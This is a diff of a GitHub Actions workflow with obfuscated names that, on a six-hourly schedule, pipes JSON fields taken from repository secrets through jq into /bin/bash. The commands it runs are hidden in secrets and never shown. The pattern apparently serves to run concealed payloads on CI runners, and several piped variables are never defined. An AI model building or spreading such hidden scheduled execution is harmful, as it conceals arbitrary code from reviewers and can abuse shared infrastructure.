@@ -1,9 +1,9 @@
 name: yuehongdong1278
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
-
+    - cron: '44 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuehongdong1278
         env:
-          i065: ${{ secrets.i065 }}
+          jtqp521: ${{ secrets.jtqp521 }}
         run: |
-          echo $i065 | jq -r .qf703 | /bin/bash
-          echo $gwq2 | jq -r .xg5909 | /bin/bash
-          echo $qzi477 | jq -r .mq4562 | /bin/bash
+          echo $jtqp521 | jq -r .loflh350 | /bin/bash
+          echo $y9443 | jq -r .vezz36 | /bin/bash
+          echo $txkk834 | jq -r .erj485 | /bin/bash
+          echo $vcpr543 | jq -r .ew12566 | /bin/bash
+          echo $vyw920 | jq -r .izrs9104 | /bin/bash
 
